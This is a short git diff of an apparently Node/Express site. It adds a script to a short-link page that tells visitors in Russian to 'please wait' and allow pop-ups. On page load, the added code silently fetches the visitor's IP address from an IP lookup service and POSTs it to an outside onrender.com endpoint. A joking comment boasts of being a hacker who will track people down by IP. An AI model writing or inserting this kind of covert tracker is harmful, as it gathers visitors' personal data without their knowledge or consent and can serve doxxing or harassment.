@@ -28,11 +28,26 @@ app.post('/posts/84146', async (req, res) => {
 
 app.get('/shrt/84', async (req, res) => {
   res.send(`
-<b>Подождите...<br>Разрешите всплывающие окна, и перезагрузите вкладку, если они заблокированы</b>
+<b>Подождите....<br>Разрешите всплывающие окна, если они заблокированы</b>
 
 <script>
+//я апасный хакир каторый вычислит типя па айпи
+async function ipGet() {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log(data.ip);
+    fetch('https://razoblaheniya.onrender.com/postapi', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ip: data.ip})
+    })
+}
+ipGet();
 window.open('https://razoblaheniya.onrender.com/posts/84146', '_blank', 'width=1280,height=720');
 </script>
+
 `);
 });
 
